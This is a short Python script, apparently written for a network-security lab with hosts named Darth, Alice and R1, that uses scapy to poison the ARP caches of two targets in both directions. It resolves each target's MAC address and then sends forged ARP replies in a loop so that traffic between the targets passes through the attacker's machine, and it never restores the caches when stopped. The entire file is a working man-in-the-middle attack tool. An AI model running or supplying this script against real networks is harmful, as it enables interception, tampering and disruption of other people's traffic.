"""
arp.py — run on Darth (attacker)
Bidirectional ARP poisoning between two targets.

Usage:
    sudo python3 arp.py 10.0.0.10 10.0.0.1
    sudo python3 arp.py 10.0.0.10 10.0.0.1 --interval 0.5
"""
from scapy.all import ARP, Ether, conf, get_if_hwaddr, sendp, srp
import typer
import time
from rich.console import Console

console = Console()


def resolve_mac(ip: str) -> str:
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=0)
    if not ans:
        console.print(f"[red]ERROR:[/red] could not resolve MAC for {ip}")
        raise SystemExit(1)
    return ans[0][1].hwsrc


def main(
    target1_ip:  str   = typer.Argument(..., help="First target IP (e.g. Alice 10.0.0.10)"),
    target2_ip:  str   = typer.Argument(..., help="Second target IP (e.g. R1 10.0.0.1)"),
    interval:    float = typer.Option(0.5, help="Seconds between poison packets"),
):
    darth_mac   = get_if_hwaddr(conf.iface)
    target1_mac = resolve_mac(target1_ip)
    target2_mac = resolve_mac(target2_ip)

    console.print(f"[red]ARP Poisoning started[/red]")
    console.print(f"  {target1_ip} ({target1_mac}) ← thinks {target2_ip} is at {darth_mac}")
    console.print(f"  {target2_ip} ({target2_mac}) ← thinks {target1_ip} is at {darth_mac}")
    console.print("[dim]Press Ctrl+C to stop.[/dim]")

    poison1 = Ether(src=darth_mac, dst=target1_mac) / ARP(
        op=2, hwsrc=darth_mac, psrc=target2_ip, hwdst=target1_mac, pdst=target1_ip)
    poison2 = Ether(src=darth_mac, dst=target2_mac) / ARP(
        op=2, hwsrc=darth_mac, psrc=target1_ip, hwdst=target2_mac, pdst=target2_ip)

    try:
        with console.status("Poisoning..."):
            sendp([poison1, poison2], loop=1, inter=interval, verbose=0)
    except KeyboardInterrupt:
        console.print("\n[yellow]Stopped.[/yellow]")


if __name__ == "__main__":
    typer.run(main)
